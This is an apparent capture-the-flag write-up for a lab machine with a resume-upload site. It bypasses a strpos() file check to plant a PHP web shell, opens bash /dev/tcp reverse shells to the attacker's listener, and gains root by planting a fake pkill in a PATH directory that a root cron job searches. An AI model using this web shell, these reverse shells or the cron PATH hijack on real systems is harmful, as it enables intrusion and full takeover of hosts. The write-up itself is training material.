
<a href="https://ibb.co/WvrbxzJf"><img src="https://i.ibb.co/d4NdWpYD/HH1.png" alt="HH1" border="0"></a>

<a href="https://ibb.co/5WDSs72x"><img src="https://i.ibb.co/Fbvy8Pnq/HH2.png" alt="HH2" border="0"></a>

In this room we have to find 2 flag which is `user.txt` and `proof.txt`.

As we know first step in pentest is always is enumeration to identify which port are opened and service are running on that, so i use `nmap` to do it.

```
root@ip-10-48-90-232:~# nmap -sC -sV -T4 10.48.187.97 -oN HH
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-04 11:30 UTC
Nmap scan report for ip-10-48-187-97.ap-south-1.compute.internal (10.48.187.97)
Host is up (0.00017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```

Based on this scan, I get to know there only two ports are open one is `22` for SSH and other one is `80` where web application is running.

So let's check the web application. It just a normal app but there option to upload a resume.

<a href="https://ibb.co/R4DzkJ9w"><img src="https://i.ibb.co/1Jm8t4LW/HH3.png" alt="HH3" border="0"></a>

As per my methodlogy i check the source code to get any useful info about it, and found something.

<a href="https://ibb.co/KjwBmF7S"><img src="https://i.ibb.co/C524WhvD/HH4.png" alt="HH4" border="0"></a>

`upload.php` file which was uploaded by the hacker who has hacked the app.

<a href="https://ibb.co/FLhRZ3B9"><img src="https://i.ibb.co/HfK5w4r0/HH5.png" alt="HH5" border="0"></a>

It expose the  `strpos()` function to decide whether the file is pdf. We can bypass this check with one extensions for eg. `shell.pdf.php`. 

So i created file named `shell.pdf.php` as following.

```
echo "<?php system($_GET['cmd']); ?>" > shell.pdf.php
```

Then uploaded to web and the source code also expose the uploaded file store under `/cvs` dir. After uploading it we can access it with `http://10.48.187.97/cvs/shell.pdf.php` it gives the `boom!` text.

<a href="https://ibb.co/0pkm5GgY"><img src="https://i.ibb.co/Q7Zp0K2Y/HH6.png" alt="HH6" border="0"></a>

Now we can access the webshell using `?cmd=<command>` we can utilize to get the reverse shell. 

```
http://10.48.187.97/cvs/shell.pdf.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.48.90.232/9001%200%3E%261%22
```

I encode the url because unable to run it direct like `bash -c 'bash -i >& /dev/tcp/10.48.90.232/9001 0>&1'` . After running it got the shell with user `www-data`. 

```
root@ip-10-48-90-232:~# rlwrap nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.48.187.97 54056
bash: cannot set terminal process group (742): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b2r:/var/www/html/cvs$ 
```

First check the `/home`, and found out user `lachlan` then list the  content of the dir. Got the first flag of the system.

```
www-data@b2r:/home/lachlan$ ls -lha
ls -lha
total 36K
drwxr-xr-x 4 lachlan lachlan 4.0K May  5  2022 .
drwxr-xr-x 3 root    root    4.0K May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3.7K Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4.0K May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4.0K May  5  2022 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
```

But `.bash_history` didn't seems empty to i check it's  content and got the something like passwd, so check it with SSH login, and password are seaprated with '\n'. 

```
www-data@b2r:/home/lachlan$ cat .bash_hi*
cat .bash_hi*
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "<Found out on your own>" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

Even after successful login it logout automatically within 5 - 10 second, so to avoid it used `-T` then i get persistent session.

```
ssh -T lachlan@10.48.187.97
```

Moreover, I found out that cronjob is running with root privillage , it can be used to escalate privillage. All commads have there absolute path except `pkill`. 

```
www-data@b2r:/home/lachlan$ cat /etc/cron.d/persistence
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

I create a `pkill` file with following to root session which automatically get it.

```
echo "bash -c 'bash -i >& /dev/tcp/10.48.90.232/4444 0>&1'" > bin/pkill; chmod +x bin/pkill
```

```
root@ip-10-48-90-232:~# rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.48.187.97 56612
bash: cannot set terminal process group (5775): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# ls
ls
root.txt
snap
root@b2r:~# cat root.txt
cat root.txt
```
